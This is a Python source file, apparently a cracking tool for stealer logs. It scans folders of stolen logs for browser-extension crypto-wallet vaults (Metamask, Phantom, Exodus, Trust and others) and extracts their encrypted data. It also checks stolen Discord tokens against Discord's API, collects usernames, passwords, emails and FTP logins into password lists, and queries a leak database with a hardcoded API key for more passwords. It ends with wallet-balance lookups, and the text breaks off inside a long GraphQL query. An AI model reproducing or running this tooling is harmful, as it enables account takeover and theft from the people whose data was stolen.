from tkinter import filedialog
from tkinter import *

from bip_utils import Bip44
from bip_utils import Bip44Coins
from bip_utils import Bip44Changes
from bip_utils import Bip39SeedGenerator

# Decoding Libs ================================
from libs.TrustDecode import extractWallets, trstDecode
from libs.WalletDecode import extensionWalletDecrypt
from libs.PhantomDecode import findldb, phmdecode
from libs.ExodusDecode import ExodusWalletReader
from libs.TronDecode import TronlinkReader
from libs.Exodushcat import extractHashcat
from libs.Cipherbcrypt import algorithmb
from libs.AtomicDecode import decryptAtomic, get_addresses

from urllib3.util import SKIP_HEADER
from requests import get, post
from hdwallet import HDWallet
from queue import Queue

import base58
import hashlib
import httpx
import threading
import json
import os
import re




def search_files(directory: str, extensions: tuple, results: list) -> None:
    """
    Searches for files with the given extensions in the specified directory.
    This is a helper function for the threads.
    """
    for entry in os.scandir(directory):
        if entry.is_file() and entry.name.endswith(extensions):
            results.append(entry.path)
        elif entry.is_dir():
            # Recursively search in sub-directories
            search_files(entry.path, extensions, results)

def start_thread(q: Queue, extensions: tuple, results: list) -> None:
    while not q.empty():
        search_files(q.get(), extensions, results)

def fast_search(directory: str, extensions: tuple = ('.seco', '.txt'), threads_count: int = 20) -> list:
    """
    Performs a fast search for files with specified extensions in the given directory using multithreading.
    """
    if not os.path.isdir(directory):
        raise ValueError(f"The path {directory} is not a valid directory")

    results = []
    threads = []
    q = Queue()

    for entry in os.scandir(directory):
        if entry.is_dir():
            q.put(entry)

    for _ in range(threads_count):
        thread = threading.Thread(target=start_thread, args=(q, extensions, results))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    return results



def find_txt_files(folder_path):
    txt_files = []
    for root, dirs, files in os.walk(folder_path):
        try:
            for file in files:
                if file.endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        except:
            continue
    
    return txt_files

def typeWallet(path):
	if path.find('metamask') != -1:
		return "Metamask"
	elif path.find('bravewallet') != -1:
		return "BraweWallet"
	elif path.find('brave_brave') != -1:
		return "BraweWalletV2"
	elif path.find('ronin') != -1:
		return "Ronin"
	elif path.find('kardiachain') != -1:
		return "KardiaChain"
	elif path.find('niftywallet') != -1:
		return "NiftyWallet"
	elif path.find('cloverwallet') != -1:
		return "CloverWallet"
	elif path.find('monstrawallet') != -1:
		return "MonstraWallet"
	elif path.find('oasiswallet') != -1:
		return "OasisWallet"
	elif path.find('binancechain') != -1:
		return "BinanceChain"
	elif path.find('coinbase') != -1:
		return "Coinbase"
	elif path.find('phantom') != -1:
		return "Phantom"
	elif path.find('tronlink') != -1:
		return "TronLink"
	elif path.find('exodus') != -1:
		return "Exodus"
	elif path.find('binancewallet') != -1:
		return "BinanceWallet"
	elif path.find('trust wallet') != -1:
		return "Trust Wallet"
	elif path.find('trust') != -1:
		return "Trust"
	elif path.find('atomic') != -1:
		return "Atomic"
	else:
		return "Unknown"

def findEncryptedData(path):
	with open(path, "r", encoding="utf-8", errors='ignore') as f: file = f.read()
	regex = [
		r'{\\\"data\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"salt\\\":\\\"(.+?)\\\"}',
		r'{\\\"encrypted\\\":\\\"(.+?)\\\",\\\"nonce\\\":\\\"(.+?)\\\",\\\"kdf\\\":\\\"pbkdf2\\\",\\\"salt\\\":\\\"(.+?)\\\",\\\"iterations\\\":10000,\\\"digest\\\":\\\"sha256\\\"}', 
		r'{\\\"ct\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"s\\\":\\\"(.+?)\\\"}',
		r'{\\\"data\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"keyMetadata\\\":{\\\"algorithm\\\":\\\"PBKDF2\\\",\\\"params\\\":{\\\"iterations\\\":(.+?)}},\\\"salt\\\":\\\"(.+?)\\\"}']
	
	for i, r in enumerate(regex):
		matches = re.search(r, file, re.MULTILINE)
		if matches:
			iterations = 10000
			data = matches.group(1)
			iv = matches.group(2)
			salt = matches.group(3)
			if len(matches.group(3)) < 7:
				iterations = int(matches.group(3))
				salt = matches.group(4)
			vault = {"data": data, "iv": iv, "salt": salt, "iterations": iterations, "type": i}
			return {"status":True, "data": vault}
	
	return {"status":False, "data": []}

def findSelectedAddress(path):
	with open(path, "r", encoding="utf-8", errors='ignore') as f: file = f.read()
	match1 = re.search(r'"selectedAddress\":\"(.+?)\",\"', file, re.MULTILINE) # Brawe \ Metamask \ KardiaChain \ NiftyWallet \ cloverWallet \ monstraWallet
	match2 = re.search(r'selectedAccounth{"address":"(.+?)",', file, re.MULTILINE) # Ronin
	if match1:
		if len(match1.group(1)) > 42:
			result = (None)
		else:
			result = match1.group(1)
	elif match2:
		result = (match2.group(1))
	else:
		result = (None)
	return result

def findData(allTxt):
	
	def eValid(email):
		rawEmail = email.split("@")
		login = rawEmail[0]
		if len(login) > 4 and len(login) <= 20:
			return True
		else:
			return False
	
	def findDiscords(file):
		try:
			tokens = [token.strip() for token in file]
			for t in tokens:
				h =  {'Authorization': t}
				me = get("https://discordapp.com/api/v9/users/@me", headers=h, timeout=2)
				if me.status_code == 200:
					info = json.loads(me.text)
					return [info['username'], info["email"], t]
				else:
					return None
		except:
			return None

	def findPassword(file):
		regex = [
			r"Username: (.*)\nPassword: (.*)", 
			r"USER: (.*)\nPASS: (.*)", 
			r"Login: (.*)\nPassword: (.*)",
			r"login: (.*)\npassword: (.*)",
			r"USER:		(.*)\nPASS:		(.*)"]
		
		regexEmail = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"  # r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b" # r"\b([a-z0-9._-]+@[a-z0-9.-]+)\b"
		eList = []
		pList = []
		for regx in regex:
			matches = re.finditer(regx, file, re.MULTILINE)
			for item in matches:
				if item.group(1): # UserName
					email = re.match(regexEmail, item.group(1)) # ищем мыльники
					if email:
						eList.append(email[0])
					else:
						if item.group(1) != "UNKNOWN" and len(item.group(1)) < 40: # Логины юзернеймы.
							pList.append(item.group(1).strip())
				if item.group(2): # password
					if item.group(2) != "UNKNOWN" and len(item.group(2)) < 40:
						pList.append(item.group(2))
		return [eList, pList]

	def findUserinfo(file):
		regex = r"UserName: (.*)\n"
		un = re.search(regex, file, re.MULTILINE)
		if un:
			return un[1].strip()
		else:
			return None

	def findAutofils(file):
		regexEmails = r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"
		eList = []
		match = re.findall(regexEmails, file, re.MULTILINE)
		for m in match:
			eList.append(m)
		return eList

	def findftpLines(file):
		regex = r"Server: (.*)\nUsername: (.*)\nPassword: (.*)"
		ftpList = []
		match = re.findall(regex, file, re.MULTILINE)
		for m in match:
			ftpList.append(m)
		return ftpList

	def antiPublick(part):
		d = "lines={}&limit=1000"
		t = "+".join(part)
		APIKEY = "3e76b217b716b3a3d1cfb57b9a3cb0d8" # Only PLUS 
		try:
			resp = post("https://antipublic.one/api/email_part_search.php?key=" + APIKEY, data=d.format(t), headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": SKIP_HEADER}).json()
			result = []
			if resp["results"]:
				for item in resp["results"]:
					pssw = item.split(":")[1]
					result.append(pssw)
			return result
		except:
			return []

	pwdList = []
	emlList = []
	
	for txt in allTxt:
		if str(txt).find("Discord") != -1:
			if txt.endswith("Tokens.txt"):
				with open(txt, "r", encoding="utf-8", errors="ignore") as f: file = f.readlines()
				itm = findDiscords(file)
				if itm:
					# print("[Discord] valid:", itm[0], itm[1], itm[2], txt)
					discord_token.append((itm[0], itm[1], itm[2]))
					pwdList.append(itm[0])
					emlList.append(itm[1])
		else:
			with open(txt, "r", encoding="utf-8", errors="ignore") as f: file = f.read()
			p = findPassword(file)
			u = findUserinfo(file)
			a = findAutofils(file)
			f = findftpLines(file)
			
			if p[0]: # .......: Если есть почты наполняем массив.
				for itm in p[0]:
					if eValid(itm):
						emlList.append(itm)
					# print("[findPassword] add:", itm, end="\r")
			if p[1]: # .......: Если есть пароли наполняем массив.
				for itm in p[1]:
					pwdList.append(itm)
					# print("[findPassword] add:", itm, end="\r")
			if u: # ..........: Если есть юзеринфо добавлям в  массив.
				pwdList.append(u)
				# print("[findUserinfo] add:", u, end="\r")
			if a: # ..........: Если есть почты в Autofils добавляем массив.
				for itm in a:
					if eValid(itm):
						emlList.append(itm)
					# print("[findAutofils] add:", itm, end="\r")
			if f: # ..........: Если есть пароли в фтп добавляем массив.
				for itm in f:
					ftp_data.append(itm)
					pwdList.append(itm[1])
					pwdList.append(itm[2])
					# print("[findftpLines] add:", itm[1], itm[2], end="\r")

	for fnme in emlList:
		if fnme:
			cutLogin = fnme.partition('@')[0] # Обрезаем собаку с логина (почту)
			# print("[cutLogin] add", cutLogin, end="\r")
			pwdList.append(cutLogin) # ..........: Обрезать с мыльников логины и в пароли запихать.
	emlList = list(set(emlList)) #......: Удаление дубликатов мыльников.

	# ...........: антипаблик (премиум) то добавляем пароли с антипаблика.
	antipssw = antiPublick(emlList)
	pwdList = pwdList + antipssw
	pwdList = list(set(pwdList)) #......: Удаляем все дубликаты в паролях.

	return [pwdList, emlList]

def debankBalanceV3(wallet):
    API_KEY = "-"
    h = {"accept": "application/json", "AccessKey": API_KEY}
    resp = get(f"https://pro-openapi.debank.com/v1/user/total_balance?id={wallet}", headers=h).json()
    return round(resp["total_usd_value"], 2)

def opensea(address):
    try:
        headers = {
            'x-app-id': 'opensea-web',
            'x-signed-query': '487ab8a857d60b3e546c98612a657cbb35e67db054e59b58d2deaa9326b53e69',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
        }
        data = {"id": "AccountCollectedAssetSearchListQuery", 
        "query": "query AccountCollectedAssetSearchListQuery(\n  $chains: [ChainScalar!]\n  $collections: [CollectionSlug!]\n  $count: Int!\n  $cursor: String\n  $identity: IdentityInputType!\n  $numericTraits: [TraitRangeType!]\n  $paymentAssets: [PaymentAssetSymbol]\n  $priceFilter: PriceFilterType\n  $query: String\n  $resultModel: SearchResultModel\n  $sortAscending: Boolean\n  $sortBy: SearchSortBy\n  $stringTraits: [TraitInputType!]\n  $toggles: [SearchToggle!]\n  $showContextMenu: Boolean!\n) {\n  ...AccountCollectedAssetSearchListPagination_data_1CyApM\n}\n\nfragment AcceptOfferButton_asset_3StDC7 on AssetType {\n  relayId\n  acceptOfferDisabled {\n    __typename\n  }\n  ownedQuantity(identity: $identity)\n  ...AcceptOfferModalContent_criteriaAsset_3StDC7\n  ...itemEvents_dataV2\n}\n\nfragment AcceptOfferButton_order_3StDC7 on OrderV2Type {\n  relayId\n  side\n  orderType\n  item {\n    __typename\n    ... on AssetType {\n      acceptOfferDisabled {\n        __typename\n      }\n      collection {\n        statsV2 {\n          floorPrice {\n            eth\n          }\n        }\n        id\n      }\n      chain {\n        identifier\n      }\n      ownedQuantity(identity: $identity)\n      ...itemEvents_dataV2\n    }\n    ... on AssetBundleType {\n      bundleCollection: collection {\n        statsV2 {\n          floorPrice {\n            eth\n          }\n        }\n        id\n      }\n      chain {\n        identifier\n      }\n      assetQuantities(first: 30) {\n        edges {\n          node {\n            asset {\n              ownedQuantity(identity: $identity)\n              id\n            }\n            id\n          }\n        }\n      }\n      ...itemEvents_dataV2\n    }\n    ... on Node {\n      __isNode: __typename\n      id\n    }\n  }\n  maker {\n    address\n    id\n  }\n  perUnitPriceType {\n    eth\n  }\n}\n\nfragment AcceptOfferModalContent_criteriaAsset_3StDC7 on AssetType {\n  __typename\n  assetContract {\n    address\n    id\n  }\n  chain {\n    identifier\n  }\n  tokenId\n  relayId\n  ownedQuantity(identity: $identity)\n  isCurrentlyFungible\n  defaultRarityData {\n    rank\n    id\n  }\n  ...ItemOfferDetails_item\n  ...FloorPriceDifference_item\n  ...readOptionalCreatorFees_item\n}\n\nfragment AccountCollectedAssetSearchListPagination_data_1CyApM on Query {\n  queriedAt\n  searchItems(first: $count, after: $cursor, chains: $chains, collections: $collections, identity: $identity, numericTraits: $numericTraits, paymentAssets: $paymentAssets, priceFilter: $priceFilter, querystring: $query, resultType: $resultModel, sortAscending: $sortAscending, sortBy: $sortBy, stringTraits: $stringTraits, toggles: $toggles) {\n    edges {\n      node {\n        __typename\n        relayId\n        ...readItemHasBestAsk_item\n        ...AssetSearchList_data_155Sn1\n        ...useAssetSelectionStorage_item_3NSiLP\n        ...PortfolioTable_items_1TFcTQ\n        ... on Node {\n          __isNode: __typename\n          id\n        }\n      }\n      cursor\n    }\n    totalCount\n    pageInfo {\n      endCursor\n      hasNextPage\n    }\n  }\n}\n\nfragment AccountLink_data on AccountType {\n  address\n  config\n  isCompromised\n  user {\n    publicUsername\n    id\n  }\n  displayName\n  ...ProfileImage_data\n  ...wallet_accountKey\n  ...accounts_url\n}\n\nfragment AddToCartAndQuickBuyButton_order on OrderV2Type {\n  ...useIsQuickBuyEnabled_order\n  ...ItemAddToCartButton_order\n  ...QuickBuyButton_order\n}\n\nfragment AssetContextMenu_data on AssetType {\n  relayId\n}\n\nfragment AssetMediaAnimation_asset on AssetType {\n  ...AssetMediaImage_asset\n  ...AssetMediaContainer_asset\n  ...AssetMediaPlaceholderImage_asset\n}\n\nfragment AssetMediaAudio_asset on AssetType {\n  backgroundColor\n  ...AssetMediaImage_asset\n}\n\nfragment AssetMediaContainer_asset on AssetType {\n  backgroundColor\n  ...AssetMediaEditions_asset_1mZMwQ\n  collection {\n    ...useIsRarityEnabled_collection\n    id\n  }\n}\n\nfragment AssetMediaContainer_asset_1LNk0S on AssetType {\n  backgroundColor\n  ...AssetMediaEditions_asset_1mZMwQ\n  collection {\n    ...useIsRarityEnabled_collection\n    id\n  }\n}\n\nfragment AssetMediaContainer_asset_23BBEz on AssetType {\n  backgroundColor\n  ...AssetMediaEditions_asset_4uIQ9K\n  collection {\n    ...useIsRarityEnabled_collection\n    id\n  }\n}\n\nfragment AssetMediaContainer_asset_2OUs0D on AssetType {\n  backgroundColor\n  ...AssetMediaEditions_asset_4uIQ9K\n  defaultRarityData {\n    ...RarityIndicator_data\n    id\n  }\n  collection {\n    ...useIsRarityEnabled_collection\n    id\n  }\n}\n\nfragment AssetMediaContainer_asset_4a3mm5 on AssetType {\n  backgroundColor\n  ...AssetMediaEditions_asset_1mZMwQ\n  defaultRarityData {\n    ...RarityIndicator_data\n    id\n  }\n  collection {\n    ...useIsRarityEnabled_collection\n    id\n  }\n}\n\nfragment AssetMediaEditions_asset_1mZMwQ on AssetType {\n  decimals\n}\n\nfragment AssetMediaEditions_asset_4uIQ9K on AssetType {\n  decimals\n  ownedQuantity(identity: $identity)\n}\n\nfragment AssetMediaImage_asset on AssetType {\n  backgroundColor\n  imageUrl\n  collection {\n    displayData {\n      cardDisplayStyle\n    }\n    id\n  }\n}\n\nfragment AssetMediaPlaceholderImage_asset on AssetType {\n  collection {\n    displayData {\n      cardDisplayStyle\n    }\n    id\n  }\n}\n\nfragment AssetMediaVideo_asset on AssetType {\n  backgroundColor\n  ...AssetMediaImage_asset\n}\n\nfragment AssetMediaWebgl_asset on AssetType {\n  backgroundColor\n  ...AssetMediaImage_asset\n}\n\nfragment AssetMedia_asset on AssetType {\n  animationUrl\n  displayImageUrl\n  imageUrl\n  isDelisted\n  ...AssetMediaAnimation_asset\n  ...AssetMediaAudio_asset\n  ...AssetMediaContainer_asset_1LNk0S\n  ...AssetMediaImage_asset\n  ...AssetMediaPlaceholderImage_asset\n  ...AssetMediaVideo_asset\n  ...AssetMediaWebgl_asset\n}\n\nfragment AssetMedia_asset_1mZMwQ on AssetType {\n  animationUrl\n  displayImageUrl\n  imageUrl\n  isDelisted\n  ...AssetMediaAnimation_asset\n  ...AssetMediaAudio_asset\n  ...AssetMediaContainer_asset_1LNk0S\n  ...AssetMediaImage_asset\n  ...AssetMediaPlaceholderImage_asset\n  ...AssetMediaVideo_asset\n  ...AssetMediaWebgl_asset\n}\n\nfragment AssetMedia_asset_2OUs0D on AssetType {\n  animationUrl\n  displayImageUrl\n  imageUrl\n  isDelisted\n  ...AssetMediaAnimation_asset\n  ...AssetMediaAudio_asset\n  ...AssetMediaContainer_asset_2OUs0D\n  ...AssetMediaImage_asset\n  ...AssetMediaPlaceholderImage_asset\n  ...AssetMediaVideo_asset\n  ...AssetMediaWebgl_asset\n}\n\nfragment AssetMedia_asset_4uIQ9K on AssetType {\n  animationUrl\n  displayImageUrl\n  imageUrl\n  isDelisted\n  ...AssetMediaAnimation_asset\n  ...AssetMediaAudio_asset\n  ...AssetMediaContainer_asset_23BBEz\n  ...AssetMediaImage_asset\n  ...AssetMediaPlaceholderImage_asset\n  ...AssetMediaVideo_asset\n  ...AssetMediaWebgl_asset\n}\n\nfragment AssetMedia_asset_5MxNd on AssetType {\n  animationUrl\n  displayImageUrl\n  imageUrl\n  isDelisted\n  ...AssetMediaAnimation_asset\n  ...AssetMediaAudio_asset\n  ...AssetMediaContainer_asset_4a3mm5\n  ...AssetMediaImage_asset\n  ...AssetMediaPlaceholderImage_asset\n  ...AssetMediaVideo_asset\n  ...AssetMediaWebgl_asset\n}\n\nfragment AssetOfferModal_asset on AssetType {\n  relayId\n  chain {\n    identifier\n  }\n}\n\nfragment AssetQuantity_data on AssetQuantityType {\n  asset {\n    ...Price_data\n    id\n  }\n  quantity\n}\n\nfragment AssetSearchListViewTableAssetInfo_item on ItemType {\n  __isItemType: __typename\n  __typename\n  ...PortfolioTableItemCellTooltip_item\n}\n\nfragment AssetSearchListViewTableQuickBuy_order on OrderV2Type {\n  maker {\n    address\n    id\n  }\n  item {\n    __typename\n    chain {\n      identifier\n    }\n    ...itemEvents_dataV2\n    ... on Node {\n      __isNode: __typename\n      id\n    }\n  }\n  openedAt\n  relayId\n}\n\nfragment AssetSearchList_data_155Sn1 on ItemType {\n  __isItemType: __typename\n  __typename\n  relayId\n  ...ItemCard_data_155Sn1\n  ... on AssetType {\n    collection {\n      isVerified\n      relayId\n      id\n    }\n  }\n  ... on AssetBundleType {\n    bundleCollection: collection {\n      isVerified\n      relayId\n      id\n    }\n  }\n  chain {\n    identifier\n  }\n  ...useAssetSelectionStorage_item_3NSiLP\n}\n\nfragment BulkPurchaseModal_orders on OrderV2Type {\n  relayId\n  item {\n    __typename\n    relayId\n    chain {\n      identifier\n    }\n    ... on AssetType {\n      collection {\n        slug\n        isSafelisted\n        id\n      }\n    }\n    ... on Node {\n      __isNode: __typename\n      id\n    }\n  }\n  payment {\n    relayId\n    symbol\n    id\n  }\n  ...useTotalPrice_orders\n  ...useFulfillingListingsWillReactivateOrders_orders\n}\n\nfragment CancelItemOrdersButton_items on ItemType {\n  __isItemType: __typename\n  __typename\n  chain {\n    identifier\n  }\n  ... on AssetType {\n    relayId\n  }\n  ... on AssetBundleType {\n    relayId\n  }\n  ...CancelOrdersConfirmationModal_items\n}\n\nfragment CancelOrdersConfirmationModal_items on ItemType {\n  __isItemType: __typename\n  __typename\n  ... on AssetType {\n    ...StackedAssetMedia_assets\n  }\n  ... on AssetBundleType {\n    assetQuantities(first: 18) {\n      edges {\n        node {\n          asset {\n            ...StackedAssetMedia_assets\n            id\n          }\n          id\n        }\n      }\n    }\n  }\n}\n\nfragment CollectionLink_assetContract on AssetContractType {\n  address\n  blockExplorerLink\n}\n\nfragment CollectionLink_collection on CollectionType {\n  name\n  slug\n  verificationStatus\n  ...collection_url\n}\n\nfragment CollectionTrackingContext_collection on CollectionType {\n  relayId\n  slug\n  isVerified\n  isCollectionOffersEnabled\n  defaultChain {\n    identifier\n  }\n}\n\nfragment CreateListingButton_item on ItemType {\n  __isItemType: __typename\n  __typename\n  ... on AssetType {\n    ...CreateQuickSingleListingFlowModal_asset\n  }\n  ...itemEvents_dataV2\n  ...item_sellUrl\n}\n\nfragment CreateQuickSingleListingFlowModal_asset on AssetType {\n  relayId\n  chain {\n    identifier\n  }\n  ...itemEvents_dataV2\n}\n\nfragment EditListingButton_item on ItemType {\n  __isItemType: __typename\n  chain {\n    identifier\n  }\n  ...EditListingModal_item\n  ...itemEvents_dataV2\n}\n\nfragment EditListingButton_listing on OrderV2Type {\n  ...EditListingModal_listing\n}\n\nfragment EditListingModal_item on ItemType {\n  __isItemType: __typename\n  __typename\n  ... on AssetType {\n    tokenId\n    assetContract {\n      address\n      id\n    }\n    chain {\n      identifier\n    }\n  }\n}\n\nfragment EditListingModal_listing on OrderV2Type {\n  relayId\n}\n\nfragment FloorPriceDifference_item on ItemType {\n  __isItemType: __typename\n  ... on AssetType {\n    collection {\n      statsV2 {\n        floorPrice {\n          eth\n        }\n      }\n      id\n    }\n  }\n}\n\nfragment ItemAddToCartButton_order on OrderV2Type {\n  maker {\n    address\n    id\n  }\n  taker {\n    address\n    id\n  }\n  item {\n    __typename\n    ... on AssetType {\n      isCurrentlyFungible\n    }\n    ...itemEvents_dataV2\n    ... on Node {\n      __isNode: __typename\n      id\n    }\n  }\n  openedAt\n  ...ShoppingCartContextProvider_inline_order\n}\n\nfragment ItemCardContent on ItemType {\n  __isItemType: __typename\n  __typename\n  relayId\n  ... on AssetType {\n    relayId\n    name\n    ...AssetMedia_asset_1mZMwQ\n  }\n  ... on AssetBundleType {\n    assetQuantities(first: 18) {\n      edges {\n        node {\n          asset {\n            relayId\n            ...AssetMedia_asset\n            id\n          }\n          id\n        }\n      }\n    }\n  }\n}\n\nfragment ItemCardContent_4uIQ9K on ItemType {\n  __isItemType: __typename\n  __typename\n  relayId\n  ... on AssetType {\n    relayId\n    name\n    ...AssetMedia_asset_4uIQ9K\n  }\n  ... on AssetBundleType {\n    assetQuantities(first: 18) {\n      edges {\n        node {\n          asset {\n            relayId\n            ...AssetMedia_asset\n            id\n          }\n          id\n        }\n      }\n    }\n  }\n}\n\nfragment ItemCardCta_item_20mRwh on ItemType {\n  __isItemType: __typename\n  __typename\n  orderData {\n    bestAskV2 {\n      ...AddToCartAndQuickBuyButton_order\n      ...EditListingButton_listing\n      ...QuickBuyButton_order\n      id\n    }\n  }\n  ...AssetContextMenu_data @include(if: $showContextMenu)\n  ...useItemCardCta_item_20mRwh\n  ...itemEvents_dataV2\n  ...CreateListingButton_item\n  ...EditListingButton_item\n}\n\nfragment ItemCardFooter_3puo6e on ItemType {\n  __isItemType: __typename\n  __typename\n  relayId\n  name\n  orderData {\n    bestBidV2 {\n      orderType\n      priceType {\n        unit\n      }\n      ...ItemCardPrice_data\n      id\n    }\n    bestAskV2 {\n      ...ItemCardFooter_bestAskV2\n      id\n    }\n    bestAskForOwnerItemCard: bestAskV2(byAddress: $identity) {\n      ...ItemCardFooter_bestAskV2\n      id\n    }\n  }\n  ...ItemMetadata_3klarN\n  ... on AssetType {\n    tokenId\n    isDelisted\n    defaultRarityData {\n      ...RarityIndicator_data\n      id\n    }\n    collection {\n      slug\n      name\n      isVerified\n      ...collection_url\n      ...useIsRarityEnabled_collection\n      id\n    }\n    largestOwner {\n      owner {\n        ...AccountLink_data\n        id\n      }\n      id\n    }\n    ...AssetSearchListViewTableAssetInfo_item\n  }\n  ... on AssetBundleType {\n    bundleCollection: collection {\n      slug\n      name\n      isVerified\n      ...collection_url\n      ...useIsRarityEnabled_collection\n      id\n    }\n  }\n  ...useItemCardCta_item_20mRwh\n  ...item_url\n  ...ItemCardContent\n}\n\nfragment ItemCardFooter_bestAskV2 on OrderV2Type {\n  orderType\n  priceType {\n    unit\n  }\n  maker {\n    address\n    id\n  }\n  ...ItemCardPrice_data\n  ...ItemAddToCartButton_order\n  ...AssetSearchListViewTableQuickBuy_order\n  ...useIsQuickBuyEnabled_order\n}\n\nfragment ItemCardPrice_data on OrderV2Type {\n  perUnitPriceType {\n    unit\n  }\n  payment {\n    symbol\n    id\n  }\n  ...useIsQuickBuyEnabled_order\n}\n\nfragment ItemCard_data_155Sn1 on ItemType {\n  __isItemType: __typename\n  __typename\n  relayId\n  chain {\n    identifier\n  }\n  orderData {\n    bestAskV2 {\n      priceType {\n        eth\n      }\n      id\n    }\n  }\n  ... on AssetType {\n    isDelisted\n    totalQuantity\n    collection {\n      slug\n      ...CollectionTrackingContext_collection\n      id\n    }\n    ...itemEvents_data\n  }\n  ... on AssetBundleType {\n    bundleCollection: collection {\n      slug\n      ...CollectionTrackingContext_collection\n      id\n    }\n  }\n  ...ItemCardContent_4uIQ9K\n  ...ItemCardFooter_3puo6e\n  ...ItemCardCta_item_20mRwh\n  ...item_url\n  ...ItemTrackingContext_item\n}\n\nfragment ItemMetadata_3klarN on ItemType {\n  __isItemType: __typename\n  __typename\n  orderData {\n    bestAskV2 {\n      openedAt\n      createdDate\n      closedAt\n      id\n    }\n    bestAskForOwnerItemCard: bestAskV2(byAddress: $identity) {\n      openedAt\n      createdDate\n      closedAt\n      id\n    }\n  }\n  assetEventData {\n    lastSale {\n      unitPriceQuantity {\n        ...AssetQuantity_data\n        quantity\n        asset {\n          symbol\n          decimals\n          id\n        }\n        id\n      }\n    }\n  }\n  ... on AssetType {\n    bestAllTypeBid {\n      perUnitPriceType {\n        unit\n        symbol\n      }\n      id\n    }\n    mintEvent {\n      perUnitPrice {\n        unit\n        symbol\n      }\n      id\n    }\n  }\n}\n\nfragment ItemOfferDetails_item on ItemType {\n  __isItemType: __typename\n  __typename\n  ... on AssetType {\n    displayName\n    collection {\n      ...CollectionLink_collection\n      id\n    }\n    ...StackedAssetMedia_assets\n  }\n  ... on AssetBundleType {\n    displayName\n    bundleCollection: collection {\n      ...CollectionLink_collection\n      id\n    }\n    assetQuantities(first: 18) {\n      edges {\n        node {\n          asset {\n            ...StackedAssetMedia_assets\n            id\n          }\n          id\n        }\n      }\n    }\n  }\n}\n\nfragment ItemTrackingContext_item on ItemType {\n  __isItemType: __typename\n  relayId\n  verificationStatus\n  chain {\n    identifier\n  }\n  ... on AssetType {\n    tokenId\n    isReportedSuspicious\n    assetContract {\n      address\n      id\n    }\n  }\n  ... on AssetBundleType {\n    slug\n  }\n}\n\nfragment MakeAssetOfferButton_asset on AssetType {\n  relayId\n  verificationStatus\n  isBiddingEnabled {\n    value\n    reason\n  }\n  chain {\n    identifier\n  }\n  ...AssetOfferModal_asset\n}\n\nfragment OrderListItem_order on OrderV2Type {\n  relayId\n  makerOwnedQuantity\n  item {\n    __typename\n    displayName\n    ... on AssetType {\n      assetContract {\n        ...CollectionLink_assetContract\n        id\n      }\n      collection {\n        ...CollectionLink_collection\n        id\n      }\n      ...AssetMedia_asset\n      ...asset_url\n      ...useItemFees_item\n    }\n    ... on AssetBundleType {\n      assetQuantities(first: 30) {\n        edges {\n          node {\n            asset {\n              displayName\n              relayId\n              assetContract {\n                ...CollectionLink_assetContract\n                id\n              }\n              collection {\n                ...CollectionLink_collection\n                id\n              }\n              ...StackedAssetMedia_assets\n              ...AssetMedia_asset\n              ...asset_url\n              id\n            }\n            id\n          }\n        }\n      }\n    }\n    ...itemEvents_dataV2\n    ...useIsItemSafelisted_item\n    ...ItemTrackingContext_item\n    ... on Node {\n      __isNode: __typename\n      id\n    }\n  }\n  remainingQuantityType\n  ...OrderPrice\n}\n\nfragment OrderList_orders on OrderV2Type {\n  item {\n    __typename\n    ... on AssetType {\n      __typename\n      relayId\n    }\n    ... on AssetBundleType {\n      __typename\n      assetQuantities(first: 30) {\n        edges {\n          node {\n            asset {\n              relayId\n              id\n            }\n            id\n          }\n        }\n      }\n    }\n    ... on Node {\n      __isNode: __typename\n      id\n    }\n  }\n  relayId\n  ...OrderListItem_order\n  ...useFulfillingListingsWillReactivateOrders_orders\n}\n\nfragment OrderPrice on OrderV2Type {\n  priceType {\n    unit\n  }\n  perUnitPriceType {\n    unit\n  }\n  payment {\n    ...TokenPricePayment\n    id\n  }\n}\n\nfragment PortfolioTableAcceptOfferButton_item_3StDC7 on ItemType {\n  __isItemType: __typename\n  __typename\n  relayId\n  ... on AssetType {\n    bestAllTypeBid {\n      ...AcceptOfferButton_order_3StDC7\n      id\n    }\n    ...AcceptOfferButton_asset_3StDC7\n  }\n  ... on AssetBundleType {\n    orderData {\n      bestBidV2 {\n        ...AcceptOfferButton_order_3StDC7\n        id\n      }\n    }\n  }\n}\n\nfragment PortfolioTableBestOfferCell_item on ItemType {\n  __isItemType: __typename\n  __typename\n  ... on AssetType {\n    bestAllTypeBid {\n      perUnitPriceType {\n        unit\n        symbol\n      }\n      id\n    }\n  }\n  ... on AssetBundleType {\n    orderData {\n      bestBidV2 {\n        priceType {\n          unit\n          symbol\n        }\n        id\n      }\n    }\n  }\n}\n\nfragment PortfolioTableBuyButton_asset_3ioucg on AssetType {\n  orderData {\n    bestAskV2 {\n      ...ItemAddToCartButton_order @skip(if: $showContextMenu)\n      id\n    }\n  }\n}\n\nfragment PortfolioTableCostCell_item on ItemType {\n  __isItemType: __typename\n  __typename\n  lastCostEvent {\n    transaction {\n      blockExplorerLink\n      id\n    }\n    id\n  }\n  pnl {\n    costPrice {\n      unit\n      symbol\n    }\n  }\n}\n\nfragment PortfolioTableDifferenceCell_item_3StDC7 on ItemType {\n  __isItemType: __typename\n  __typename\n  relayId\n  ... on AssetType {\n    orderData {\n      bestAskV2 {\n        __typename\n        id\n      }\n      bestAskForOwner: bestAskV2(byAddress: $identity) {\n        __typename\n        id\n      }\n    }\n    pnl {\n      pnlPrice {\n        unit\n        symbol\n      }\n    }\n  }\n}\n\nfragment PortfolioTableExpandedRow_item_1TFcTQ on ItemType {\n  __isItemType: __typename\n  __typename\n  relayId\n  ... on AssetType {\n    isCompromised\n    isCurrentlyFungible\n    ...asset_url\n    ...AssetMedia_asset_2OUs0D\n    ...PortfolioTableBuyButton_asset_3ioucg\n    ...PortfolioTableMakeOfferButton_asset_3ioucg\n    